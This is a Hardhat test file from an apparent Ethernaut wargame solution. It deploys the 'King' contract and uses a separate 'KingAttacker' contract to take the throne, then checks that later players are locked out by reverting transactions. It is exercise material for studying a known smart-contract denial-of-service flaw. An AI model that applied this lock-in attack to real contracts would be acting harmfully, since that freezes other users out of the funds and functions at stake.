import {expect} from 'chai';
import {ethers} from 'hardhat';
import {SignerWithAddress} from '@nomiclabs/hardhat-ethers/signers';
import {King} from '../../types/typechain';

describe('Ethernaut 9: King', () => {
  let owner: SignerWithAddress;
  let attacker: SignerWithAddress;
  let victim: SignerWithAddress;

  let contract: King;

  before(async () => {
    [owner, attacker, victim] = await ethers.getSigners();
    contract = await ethers
      .getContractFactory('King', owner)
      .then(f => f.deploy({value: ethers.utils.parseEther('0.001')}));
    await contract.deployed();
  });

  it('should become the king', async () => {
    const attackerContract = await ethers.getContractFactory('KingAttacker', attacker).then(f => f.deploy());
    await attackerContract.deployed();

    attackerContract.pwn(contract.address, {value: ethers.utils.parseEther('0.002')});
  });

  after(async () => {
    // another person shouldn't be able to become the king
    await expect(
      victim.sendTransaction({
        to: contract.address,
        value: ethers.utils.parseEther('0.003'),
      })
    ).to.be.revertedWith('nope');
  });
});
